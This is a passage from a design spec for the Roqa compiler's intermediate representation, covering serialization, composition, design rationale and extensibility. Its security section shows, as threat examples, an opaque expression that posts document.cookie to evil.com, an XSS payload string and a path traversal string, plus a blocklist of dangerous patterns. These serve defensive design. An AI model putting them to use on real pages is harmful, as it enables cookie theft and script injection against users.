   or emits. Names must be valid JavaScript identifiers.

6. **Tag names must be valid custom element names** — contain a hyphen, lowercase,
   no reserved names.

### Validation

The backend validates the MIR before code generation. Validation errors mean
the frontend produced invalid IR and must be fixed at the frontend level. See
[compiler.md §Phase 1](./compiler.md#phase-1-validate) for the full list of
validation checks and their severities.

### Serialization format

The MIR is serialized as **JSON**. This was chosen for:

- **Debuggability** — you can inspect and hand-edit IR files
- **Universal support** — every language has a JSON library
- **Tooling** — JSON Schema, linters, diff tools all work out of the box

File extension: `.roqa-ir.json`

The MIR can also be passed as an in-memory JavaScript object (skipping
serialization) when the frontend runs in the same process as the backend
(e.g., a Vite plugin).

A JSON Schema for MIR validation will be provided so frontend authors can
validate their output independently of the Roqa backend.

---

## Component composition

Components compose by rendering child custom elements. In the MIR, a child
component is represented as a regular `ElementIR` node with a custom element
tag name:

```json
{
    "kind": "element",
    "tag": "todo-item",
    "attributes": {
        "text": { "kind": "state-read", "name": "itemText" }
    },
    "events": [
        { "event": "remove", "handler": { "kind": "action-call", "name": "removeItem", "args": [] } }
    ],
    "children": []
}
```

The backend treats custom element tags the same as native HTML tags at the
template and traversal level.

### Attributes on custom elements vs native elements

The MIR does not distinguish between attributes on native HTML elements and
attributes on custom elements — both use `ElementIR.attributes`. The
**compiler** is responsible for detecting custom element tags (tags containing
a hyphen) and generating the correct output:

- **Native HTML element attributes** → static attributes go into the template
  HTML, dynamic attributes use property assignment or `setAttribute()`.
- **Custom element attributes** → attributes become props passed via the
  runtime's `setProp()` mechanism (WeakMap-based), which allows props to be
  set before the child element's `connectedCallback` fires.

This distinction is intentionally a **compiler concern**, not a MIR concern.
The MIR stays simple — a parent component doesn't need to know how a child
component declares its props/attrs. The runtime's `getProps()` function
resolves the mapping at connect time based on how the child's
`defineComponent()` is configured.

Cross-component type checking (e.g., verifying that a parent passes the right
props to a child) is **not** part of the MIR or backend. This is a frontend
responsibility — a TypeScript-based frontend can use types, a visual builder
can use its own schema validation. The MIR intentionally stays out of this to
avoid coupling frontends to each other.

For files that export multiple components, each component produces its own
`ComponentIR`. The backend processes them independently and emits them into the
same output module.

---

## Design decisions and rationale

### Why discriminated unions (tagged `kind` fields)?

Every IR node has a `kind` field. This is deliberate:

1. **Exhaustive matching** — TypeScript will warn if you add a new IR variant
   but forget to handle it in a switch statement.
2. **Serializable** — the IR can be JSON-serialized for caching or debugging.
   The `kind` field survives serialization (unlike `instanceof` checks).
3. **Inspectable** — you can `console.log(node)` and immediately see what
   it is. No need to check constructor names or prototype chains.

### Why structured expressions instead of source text?

Earlier drafts captured action and computed bodies as raw JavaScript source
strings. This was simpler but broke frontend-independence — a GUI builder or
a custom DSL shouldn't need to generate JavaScript text. The structured expression
IR is more verbose but provides:

1. **Frontend-independence** — any tool that can produce JSON can produce
   expressions. No JS parser needed.
2. **Analyzability** — the backend can walk the expression tree to derive
   dependencies, detect side effects, and optimize. With source strings, this
   required fragile regex-based rewrites.
3. **Serializability** — expression trees are plain JSON objects. No circular
   references, no parser-specific metadata.

The `OpaqueExpr` escape hatch exists for cases where structured expressions
would be impractical (complex algorithms, external library calls). But every
opaque expression is a missed optimization opportunity, so frontends should
prefer structured expressions.

### Why separate `cell-ref` from expression reads?

These represent fundamentally different operations:

- `cell-ref` = "I need the cell object itself" → used for subscription
  (`forBlock`, `showBlock`)
- `state-read` / `computed-read` / etc. = "I need the current value" → used
  for rendering (`nodeValue`, `className`, attribute values)

Collapsing them into one type would force the code generator to infer intent
from context, which is exactly the kind of ambiguity an IR should eliminate.
The name `CellRef` (rather than the earlier `StateRef`) reflects that any
state-kind entry (value, collection, or computed) becomes a cell at runtime.

### Why unify ref types into ExprIR?

Earlier drafts had two parallel type systems: "ref types" (`StaticValue`,
`ReactiveRead`, `ActionRef`, `BoundActionRef`, `ItemFieldRef`) used in the
view tree, and `ExprIR` used in action/computed bodies. These overlapped
significantly — `StaticValue` was just `LiteralExpr`, `ReactiveRead` was
just `StateReadExpr`/`PropReadExpr`/etc.

Unifying into `ExprIR` everywhere eliminates the parallel type system and
provides concrete benefits:

1. **Expressiveness** — attributes, class conditions, and style values can
   now hold arbitrary expressions (`data-total={count + 1}`), not just
   single-value reads.
2. **Fewer types** — frontends produce one expression system, not two.
3. **Consistency** — the backend walks expression trees the same way
   regardless of context (action body, attribute value, class condition).

The `CellRef` survives as the only non-ExprIR ref type because it has
genuinely different semantics (cell identity for subscription, not a value).

### Why a separate `reactive-text` node kind?

The view tree needs every child to have a unique, unambiguous `kind`. An
expression can appear in many contexts (attribute values, class conditions,
style values), but when it appears as a child of an element, it specifically
means "create a text node and bind it." Giving it the distinct
`kind: "reactive-text"` makes this role explicit and prevents the code
generator from needing to infer context.

### Why `render` is an array, not a single `NodeIR`

Earlier drafts used `render: NodeIR` with an implicit `FragmentIR` wrapper for
multiple roots. An array is simpler — no wrapper node needed for the common
case, and no special-casing for single-element vs multi-element roots.

---

## IR versioning

The `version` field on `ComponentIR` enables:

- **Cache invalidation** — cached MIR is invalidated when the format changes
- **Migration** — multiple MIR versions can coexist during transitions
- **Clear errors** — a frontend producing v1 MIR against a v2 backend gets an
  immediate, actionable error

The version increments on any **breaking change** to the MIR types — adding a
new optional field is non-breaking; changing a field's type or removing a field
is breaking.

---

## Open questions

### Variable declarations and assignments

The expression IR currently handles state reads/writes as first-class nodes,
but doesn't have a general-purpose `let`/`const` declaration or local variable
assignment. Action bodies sometimes need local temporaries (e.g., computing an
intermediate value before setting state). Currently this would require either:
- Nesting expressions (which can get unwieldy)
- Using `OpaqueExpr` for the whole action body

A `LetExpr` or `AssignExpr` node may be needed if action logic grows beyond
simple one-liners. Worth monitoring as real-world components are built.

### Async expressions

The expression IR has no concept of `async`/`await`. For the initial
implementation this is fine — reactive UI updates should be synchronous. But
actions that fetch data or perform async operations will eventually need
either:
- An `AwaitExpr` node in the expression IR
- A dedicated `AsyncActionIR` variant
- Relegation to `OpaqueExpr` for now

This interacts with the server functions / data fetching story (see §Meta-
framework extensibility below).

---

## IR scope: lean vs. comprehensive

A key design question is how much of JavaScript's semantics the expression IR
should capture. The current IR covers a focused subset — state operations,
basic operators, function calls, closures, and collection operations. Should it
grow to cover more of JS?

### The case for staying lean

The IR is not a general-purpose programming language. It's specifically
designed for **UI component logic** — the reactive bindings, state
transformations, and event handling that make components tick. Most of this
logic is simple: read state, compute something, write state, emit an event.

A lean IR has concrete advantages:
- **Easier to implement and maintain** — fewer node types = smaller compiler
- **Easier for frontends** — fewer types to produce
- **Better optimization** — the compiler can deeply understand every node type
- **`OpaqueExpr` exists** — truly complex logic has an escape hatch

### The case for growing over time

Real-world components will inevitably need:
- `try`/`catch` for error handling
- `for`/`while` loops for imperative logic
- Local variable declarations
- Async operations
- Type narrowing patterns (though Roqa's IR is untyped at runtime)

Each of these requires either an IR node or an `OpaqueExpr`. The more
`OpaqueExpr` usage, the less the backend can optimize and the weaker the
frontend-independence guarantee (since opaque source is raw JS).

### The recommended path

**Start lean, grow deliberately.** The current expression IR covers the
80/20 — the operations that appear in the vast majority of UI component logic.
As real-world usage reveals which patterns consistently require `OpaqueExpr`,
promote those patterns to structured nodes.

The key discipline: every new expression node must justify itself with
concrete examples from real components. Don't add nodes speculatively.

This is the same approach LLVM took — LLVM IR started with a focused
instruction set and grew over 20 years as new patterns emerged from real
language frontends.

---

## Security considerations

Security must be a first-class concern in the IR design, not an afterthought.
The IR sits at a critical boundary — it's the contract between untrusted
frontend input and trusted backend codegen. A malicious or buggy frontend
could produce IR that generates dangerous code.

### Threat model

The IR may be produced by:
- A trusted JSX frontend running in the developer's build pipeline
- A third-party frontend (DSL, GUI builder) that may have bugs
- A frontend built by an AI agent or other automated tooling
- A `.roqa-ir.json` file that could have been hand-edited or tampered with

The backend must produce safe output regardless of the IR source. "Safe" means:
no XSS, no arbitrary code execution beyond what the component author intended,
no DOM clobbering, no prototype pollution.

### Risk areas and mitigations

#### 1. `OpaqueExpr` — arbitrary code execution (HIGH)

**Risk:** `OpaqueExpr.source` is raw JavaScript that gets embedded directly in
the output. A malicious IR could inject arbitrary code:

```json
{
    "kind": "opaque",
    "source": "fetch('https://evil.com', { method: 'POST', body: document.cookie })",
    "reads": [],
    "writes": []
}
```

**Mitigations:**
- **Validation warning:** Every `OpaqueExpr` triggers an `opaque-expression`
  diagnostic. In a "strict" validation mode, this becomes an error.
- **Static analysis on source:** The backend can perform lightweight checks
  on the source string — reject patterns like `eval(`, `Function(`,
  `document.cookie`, `innerHTML`, `fetch(` (configurable blocklist).
- **CSP compatibility:** Document that Roqa-generated code is designed to work
  with Content Security Policy headers. The backend should never generate
  `eval()` or inline event handlers (`onclick="..."`) that would violate CSP.
- **Sandboxing consideration:** For high-security contexts, the backend could
  wrap opaque source in a restricted scope that limits available globals.

#### 2. Event handler injection (MEDIUM)

**Risk:** An inline event handler with a malicious body expression could
exfiltrate data or perform unintended actions.

**Mitigations:**
- Inline handlers use the structured `ExprIR` — the backend controls what
  code is generated.
- Event handler bodies are `ExprIR` nodes, not raw source — this limits what
  can be expressed to the IR's operation set.
- Named action references (`ActionCallExpr`) are preferred over inline
  handlers, keeping logic centralized in declared actions.

#### 3. DOM clobbering via attribute values (MEDIUM)

**Risk:** Static attribute values could be crafted to interfere with DOM APIs.
For example, setting `id` or `name` to values that shadow global properties.

**Mitigations:**
- **Validation check:** Warn on `id` values that match global property names
  (`location`, `navigator`, `document`, etc.).
- **Attribute name blocklist:** Reject or warn on dangerous attribute names
  like `is` (custom element hijacking) or `srcdoc` (iframe injection).

#### 4. Template injection (MEDIUM)

**Risk:** If a static string value in the MIR contains unescaped HTML, it
could break out of the template context. For example:

```json
{ "kind": "literal", "value": "</button><script>alert('xss')</script><button>" }
```

**Mitigations:**
- **HTML-escape static attribute values** in template generation. The backend
  should always escape `<`, `>`, `"`, `&` in attribute values.
- **Template strings are build-time only** — they come from the IR, not from
  user input at runtime. The risk is limited to malicious IR producers.

#### 5. Prototype pollution via initial state values (LOW)

**Risk:** `StateValueIR.initial` accepts `unknown` — a malicious IR could set
initial values with `__proto__` properties.

**Mitigations:**
- **Serialize initial values safely** — use `JSON.stringify` / `JSON.parse`
  round-tripping rather than directly embedding object literals in output.
- **Validation check:** Reject initial values with `__proto__`,
  `constructor`, or `prototype` keys.

#### 6. Import path traversal (LOW)

**Risk:** `ImportedRefExpr.source` could contain path traversal:
`"../../../etc/passwd"` or `"file:///..."`.

**Mitigations:**
- **Validate import specifiers** — reject absolute paths, `file://` URLs,
  and path traversal patterns (`../` beyond the project root).
- **Allowlist patterns** — only allow relative paths (`./`, `../` within
  bounds) and bare specifiers (`lodash`, `@scope/pkg`).

### Security validation mode

The backend should support a `strict` security mode that:
- Promotes all security-related warnings to errors
- Rejects all `OpaqueExpr` nodes
- Validates all import paths against an allowlist
- Runs static analysis on all string values for injection patterns

This mode is recommended for CI pipelines and production builds where the IR
source may not be fully trusted.

```ts
compile(mir, {
    security: "strict"  // or "standard" (default)
})
```

---

## Ecosystem interoperability

For Roqa to be valuable in the web ecosystem, the IR and backend must handle
real-world interop scenarios as first-class concerns.

### Third-party library usage

Components will import and use third-party libraries — date formatting,
validation, animation, state management utilities, etc. The IR supports this
through:

- **`ImportedRefExpr`** — explicit imports from npm packages
- **`ExternalRefExpr`** — references to browser globals and builtins
- **`OpaqueExpr`** — escape hatch for complex library APIs

The backend must preserve import statements in the output so bundlers (Vite,
webpack, Rollup) can resolve them normally. The IR doesn't try to understand
third-party code — it just makes the references explicit.

### CSS and styling

The IR handles inline styles (`StyleIR`) and class bindings (`ClassIR`) but
does not attempt to model CSS-in-JS, CSS modules, or utility-class frameworks
(Tailwind, etc.). This is deliberate:

- CSS is its own language with its own tooling chain
- Trying to model CSS in the IR would massively expand the spec with little
  benefit
- The output is standard web components — CSS can be applied externally via
  regular stylesheets, adopted stylesheets, or (in the future) shadow DOM

A future `StylesheetIR` could associate a component with its CSS (e.g., for
shadow DOM encapsulation), but this is not part of v1.

### TypeScript

The MIR is untyped — it doesn't carry TypeScript annotations. Type checking
is a frontend responsibility:

- A TypeScript-based frontend validates types before producing MIR
- The MIR's `metadata` can optionally carry type information for tooling
- The backend doesn't need types to generate correct output

This separation keeps the MIR simple and avoids forcing non-TypeScript
frontends (visual builders, DSLs) to produce type information they don't have.

### Web platform APIs

Components will use Web APIs — `fetch`, `localStorage`, `URL`, `FormData`,
`IntersectionObserver`, etc. These are all accessible through
`ExternalRefExpr`:

```json
{
    "kind": "external-ref",
    "name": "localStorage",
    "path": ["getItem"]
}
```

The backend doesn't special-case any Web API — it treats them all as external
references and generates the appropriate property access chains.

### Custom elements interop

Roqa components are standard web components (`defineComponent` →
`customElements.define`). This means they automatically interop with:

- Other Roqa components (via custom element tags in the render tree)
- Components from other frameworks (Lit, Stencil, vanilla CE)
- Any framework that can render custom elements (React, Vue, Angular, Svelte)

The IR models child custom elements as regular `ElementIR` nodes with custom
element tag names — no special interop layer needed.

### Build tool integration

The IR is designed to work within the existing JavaScript build ecosystem:

- **Vite** — the primary integration point (via the Roqa Vite plugin)
- **Other bundlers** — the `compile()` function accepts MIR and returns JS
  strings, making it embeddable in any build tool's transform pipeline
- **Pre-compiled IR** — `.roqa-ir.json` files can be consumed directly,
  enabling frontend-agnostic workflows where the IR is generated by one tool
  and compiled by another

---

## Meta-framework extensibility

In the long run, Roqa aims to support a rich ecosystem of primitives beyond
component rendering — routing, forms, SSR, server functions, data fetching,
etc. The question is: should these be modeled in the IR?

### What belongs in the IR vs. what lives above it

The IR should model **things that affect code generation**. If a concept
changes what JavaScript the backend emits, it belongs in the IR. If it's
purely a runtime concern (orchestrating components, managing navigation), it
lives above the IR as a library or framework layer.

| Concern | In the IR? | Rationale |
| --- | --- | --- |
| Component rendering | ✅ Yes | Core purpose of the IR |
| Reactive state | ✅ Yes | Directly affects codegen (cells, bindings) |
| Event handling | ✅ Yes | Affects codegen (delegation, handlers) |
| Conditional/list rendering | ✅ Yes | Affects codegen (showBlock, forBlock) |
| Server-side rendering (SSR) | ✅ Partially | Affects codegen (hydration markers, serialization) |
| Server functions | ✅ Partially | Affects codegen (client/server boundary split) |
| Data fetching | ⚠️ Maybe | Could inform codegen (suspense, loading states) |
| Routing | ❌ No | Runtime concern — library above the IR |
| Form validation | ❌ No | Runtime concern — library above the IR |
| Component library (design system) | ❌ No | Composition of primitives, not a new primitive |
| Authentication | ❌ No | Application-level concern |
| State management (global) | ⚠️ Maybe | Could extend the cell system |

### How to extend the IR for new primitives

The IR is designed to be extended without breaking existing frontends:

1. **New node types** — add new variants to `NodeIR`, `ExprIR`, etc.
   Existing frontends don't produce them, so they're not affected.

2. **New metadata** — add optional fields to `ComponentMetadata`.
   Frontends that don't know about them simply omit them.

3. **New sections on `ComponentIR`** — e.g., `serverFunctions: ServerFnIR[]`.
   Frontends that don't use server functions leave the array empty.

The `version` field ensures that when breaking changes are needed (which adding
required fields would be), frontends get clear errors.

### SSR and hydration (future)

SSR requires the backend to generate two outputs from the same MIR:
- **Server output** — renders the component to an HTML string
- **Client output** — hydrates the existing DOM instead of creating it

This affects the IR in two ways:

1. **Hydration markers** — the template may need IDs or markers so the client
   can find the right DOM nodes during hydration (instead of cloning a
   template and appending).

2. **Serialization** — initial state values need to be serialized into the
   HTML so the client can rehydrate without re-fetching data.

These could be modeled as:
```ts
type ComponentIR = {
    // ...existing fields...
    ssr?: {
        mode: "full" | "partial" | "islands";
        serializedState?: string[];  // Which state properties to serialize
    };
};
```

This is a future concern — the v1 IR is client-side only.

### Server functions (future)

Server functions (like Solid's `"use server"` or Next's server actions) split
a single component's logic across the client/server boundary. This is a deep
concern that affects codegen:

```ts
type ActionIR = {
    kind: "action";
    name: string;
    params: string[];
    body: ExprIR;
    server?: boolean;             // If true, this action runs on the server
                                  // Backend generates an RPC call on the client
};
```

This is also a future concern but worth noting here because it affects the
`ActionIR` type shape. The key insight is that server functions are a
compilation concern (the backend must split code), not just a runtime concern.

---

## Next steps

### Canonical JSX frontend HIR

This document intentionally does not specify HIR formats — each frontend
defines its own. A canonical HIR specification for the JSX frontend will
eventually be created as a separate document (e.g., `spec/jsx-frontend.md`).
This will serve as a reference implementation for other frontend authors and
document how JSX syntax maps to MIR constructs.

### Shadow DOM and slots

Roqa components currently render as custom elements with **light DOM** — the
component markup is rendered as direct children of the custom element. Shadow
DOM is not supported in v1.

Future versions may add Shadow DOM support, which would enable:
- Style encapsulation via shadow roots
- `<slot>` elements for content projection (a `SlotIR` node in the MIR)
- Adopted stylesheets scoped to the component

When Shadow DOM support is added, the MIR will be extended with optional
`shadow` configuration on `ComponentIR` and `SlotIR` nodes in the
`ComponentMetadata`. The default will remain light DOM for backward
compatibility.

### `RawHtmlIR` — trusted HTML insertion

A `RawHtmlIR` node type (`kind: "raw-html"`) for inserting trusted HTML
strings directly into the DOM is deferred from v1. This is a significant
security concern — it creates a direct XSS attack vector if the HTML comes
from untrusted sources.

When this is added in a future version, it will require:
- A `raw-html-used` validation warning for every usage
- Static analysis of HTML strings at build time to reject dangerous patterns
  (script tags, event handler attributes, `javascript:` URLs)
- Optional runtime sanitization for dynamic (reactive) HTML values
- A `trusted: boolean` flag for explicitly opting out of sanitization
- Full support in the `strict` security mode (reject all `RawHtmlIR` in
  strict mode)

Until `RawHtmlIR` is implemented, components that need to render HTML strings
should use standard DOM APIs via `OpaqueExpr` or lifecycle hooks.